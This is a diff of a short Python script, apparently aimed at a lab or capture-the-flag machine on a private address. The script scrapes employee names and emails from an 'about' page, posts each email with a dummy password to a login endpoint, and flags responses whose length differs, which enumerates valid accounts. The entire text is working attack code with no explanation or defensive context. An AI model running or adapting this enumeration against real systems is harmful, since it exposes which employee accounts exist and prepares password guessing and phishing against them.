@@ -2,19 +2,20 @@
 import requests
 from bs4 import BeautifulSoup
 
-# First scrape the employee list
 r = requests.get('http://192.168.56.68:8080/about.html')
 soup = BeautifulSoup(r.text, 'html.parser')
 
-# Try logging in with each employee's email
-# We'll use a dummy password just to find who has a valid account
-# A valid user will return a different response (not just "invalid user")
-employees = soup.find_all('tr')  # adjust based on actual HTML structure
+employees = soup.find_all('tr')
 
 for emp in employees:
     cells = emp.find_all('td')
     if len(cells) >= 2:
         email = cells[1].text.strip()
-        r = requests.post('http://192.168.56.68:8080/login-3', 
-                         data={'username': email, 'password': 'test'})
-        print(f"{email} -> {len(r.text)} bytes | {r.text[:50]}")
+        name = cells[0].text.strip()
+        r2 = requests.post('http://192.168.56.68:8080/login-3',
+                          data={'username': email, 'password': 'test'})
+        size = len(r2.text)
+        if size != 1102:
+            print(f"*** DIFFERENT *** {name} | {email} -> {size} bytes")
+        else:
+            print(f"{name} | {email} -> {size} bytes")
